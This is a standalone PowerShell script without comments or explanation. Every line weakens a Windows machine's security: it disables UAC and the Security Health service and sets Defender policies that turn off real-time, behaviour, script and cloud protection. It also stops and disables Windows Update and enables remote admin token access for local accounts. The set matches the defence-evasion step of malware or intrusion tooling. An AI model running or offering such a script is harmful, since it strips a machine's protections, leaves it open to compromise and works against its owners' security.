Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Type DWord

Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\SecurityHealthService" -Name "Start" -Value 4 -Type DWord

New-Item -Path "HKLM:\Software\Policies\Microsoft" -Name "Windows Defender" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord

Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender" -Name "DisableAntiVirus" -Value 1 -Type DWord

New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows Defender" -Name "MpEngine" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\MpEngine" -Name "MpEnablePus" -Value 0 -Type DWord

New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows Defender" -Name "Real-Time Protection" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -Type DWord
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableIOAVProtection" -Value 1 -Type DWord
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 -Type DWord
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -Type DWord
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScriptScanning" -Value 1 -Type DWord

New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows Defender" -Name "Reporting" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Reporting" -Name "DisableEnhancedNotifications" -Value 1 -Type DWord

New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows Defender" -Name "SpyNet" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet" -Name "DisableBlockAtFirstSeen" -Value 1 -Type DWord
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet" -Name "SpynetReporting" -Value 0 -Type DWord
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet" -Name "SubmitSamplesConsent" -Value 2 -Type DWord

$defenderTasks = @("Windows Defender", "Windows Defender Scheduled Scan", "Windows Defender Verification")
foreach ($task in $defenderTasks) {
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $task -Value "" -Type String
}

Stop-Service -Name wuauserv -Force
Set-Service -Name wuauserv -StartupType Disabled

New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows" -Name "WindowsUpdate" -Force | Out-Null
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Name "AU" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "NoAutoUpdate" -Value 1 -Type DWord

Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -Type DWord
